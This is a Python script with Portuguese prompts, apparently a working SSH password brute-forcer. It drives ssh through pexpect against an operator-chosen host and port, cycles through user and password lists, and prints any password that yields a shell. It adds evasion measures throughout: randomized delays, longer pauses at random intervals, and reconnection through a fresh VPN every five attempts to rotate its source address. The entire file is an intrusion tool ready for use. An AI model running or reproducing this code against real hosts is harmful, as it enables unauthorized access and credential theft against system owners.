import pexpect
import random
import passwords
import time
import vpn
import users

passwordsl = passwords.passwords_
usersl = users.users_
openvpn_enter = vpn.openvpn_enter_()

finded = False

j = 0

KEY_CONFIRMATION = "key_confirmation"
FIRST_PASSWORD = "first_password"
PASSWORD = "password"
SHELL = "shell"
DENIED = "denied"
END = "end"
TIMEOUT = "timeout"


def expect_state(process, states):
    patterns = [pattern for _, pattern in states]
    try:
        result = process.expect(patterns)
    except pexpect.EOF:
        return END
    except pexpect.TIMEOUT:
        return TIMEOUT
    return states[result][0]

i = int(input("Qual o valor inicial do usuário: "))
j = int(input("Qual o valor inicial da senha: "))

destino = str(input("Qual o destino: "))
port = str(input("Qual a porta: "))

next_ = random.randint(30, 45)
next5 = 5

tries_exceeded = 0

while i < len(usersl):
    
    with open("/tmp/status", "r") as f:
        lines = f.readlines()

    lines[1] = f"{i}\n"

    with open("/tmp/status", "w") as f:
        f.writelines(lines)

    while j < len(passwordsl):

        with open("/tmp/status", "r") as f:
            lines = f.readlines()
    
        lines[2] = f"{j}\n"

        with open("/tmp/status", "w") as f:
            f.writelines(lines)

        process = pexpect.spawn(
            "ssh",
            [f"{usersl[i]}@{destino}", "-p", port],
            encoding="utf-8",
            timeout=10,
        )

        try:
            result = expect_state(process, [
                (KEY_CONFIRMATION, r"Are you sure you want to continue connecting"),
                (FIRST_PASSWORD, r"\(.*\) Password:"),
                (PASSWORD, r".+'s password:"),
                (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
                (DENIED, r"Permission denied"),
                (END, pexpect.EOF),
                (TIMEOUT, pexpect.TIMEOUT),
            ])

            if result == KEY_CONFIRMATION:
                print("Aceitando a chave do servidor...")
                process.sendline("yes")
                result = expect_state(process, [
                    (FIRST_PASSWORD, r"\(.*\) Password:"),
                    (PASSWORD, r".+'s password:"),
                    (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
                    (DENIED, r"Permission denied"),
                    (END, pexpect.EOF),
                    (TIMEOUT, pexpect.TIMEOUT),
                ])

            while result in (FIRST_PASSWORD, PASSWORD):
                process.sendline(str(passwordsl[j]))
                result = expect_state(process, [
                    (PASSWORD, r".+'s password:"),
                    (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
                    (DENIED, r"Permission denied"),
                    (END, pexpect.EOF),
                    (TIMEOUT, pexpect.TIMEOUT),
                ])
        except pexpect.EOF:
            result = END
        except pexpect.TIMEOUT:
            result = TIMEOUT

        if result == SHELL:
            password = passwordsl[j]
            print(password)
            process.close()

            finded = True

            with open("/tmp/status", "r") as f:
                lines = f.readlines()
            
            lines[3] = "True\n"

            with open("/tmp/status", "w") as f:
                f.writelines(lines)

            break

        if result == DENIED:
            print("Permissão negada.")
        elif result == END:
            print("A conexão foi encerrada.")
        elif result == TIMEOUT:
            print("Tempo limite atingido.")
            
        if j == next_:
            time.sleep(random.randint(15, 20))
            next_ += random.randint(35, 55)

        delay = random.randint(1, 3)
        time.sleep(delay)

        if result in (END, TIMEOUT):
            tries_exceeded += 1

            if tries_exceeded >= 15:
                print("Muitas tentativas falhadas. Encerrando...")
                process.close()
                break

            process.close()
            continue

        tries_exceeded = 0
        process.close()
        
        if j >= next5:
            openvpn_enter.close()
            openvpn_enter = vpn.openvpn_enter_()
            next5 += 5

        j += 1

    if tries_exceeded >= 15:
        break

    if finded == True:
        break

    i += 1
    j = 0

openvpn_enter.close()